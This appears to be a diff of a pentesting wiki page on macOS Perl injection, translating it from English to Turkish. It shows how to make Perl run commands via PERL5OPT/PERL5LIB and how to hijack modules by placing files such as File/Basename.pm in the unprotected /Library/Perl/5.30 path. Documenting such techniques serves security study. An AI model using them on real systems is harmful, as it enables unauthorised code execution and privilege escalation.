@@ -1,49 +1,38 @@
-# macOS Perl Applications Injection
+# macOS Perl Uygulamaları Enjeksiyonu
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## `PERL5OPT` & `PERL5LIB` ortam değişkeni aracılığıyla
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
-
+PERL5OPT ortam değişkenini kullanarak perl'in rastgele komutlar çalıştırması sağlanabilir.\
+Örneğin, bu scripti oluşturun:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-
-Now **export the env variable** and execute the **perl** script:
-
+Şimdi **env değişkenini dışa aktarın** ve **perl** betiğini çalıştırın:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
-
+Başka bir seçenek, bir Perl modülü oluşturmaktır (örneğin, `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-
-And then use the env variables:
-
+Ve ardından env değişkenlerini kullanın:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## Bağımlılıklar aracılığıyla
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+Perl'in çalıştırdığı bağımlılık klasör sırasını listelemek mümkündür:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+Bu, şöyle bir şey döndürecektir:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -55,15 +44,14 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+Bazı döndürülen klasörler hiç var olmuyor, ancak **`/Library/Perl/5.30`** **vardır**, **SIP** tarafından **korunmamaktadır** ve **SIP** tarafından **korunan** klasörlerden **öncedir**. Bu nedenle, biri o klasörü kötüye kullanarak oraya script bağımlılıkları ekleyebilir, böylece yüksek ayrıcalıklı bir Perl scripti bunu yükleyebilir.
 
 > [!WARNING]
-> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+> Ancak, o klasöre yazmak için **root olmanız gerektiğini** unutmayın ve günümüzde bu **TCC istemini** alacaksınız:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+Örneğin, bir script **`use File::Basename;`** ifadesini kullanıyorsa, `/Library/Perl/5.30/File/Basename.pm` oluşturmak ve keyfi kod çalıştırmak mümkün olacaktır.
 
 ## References
 
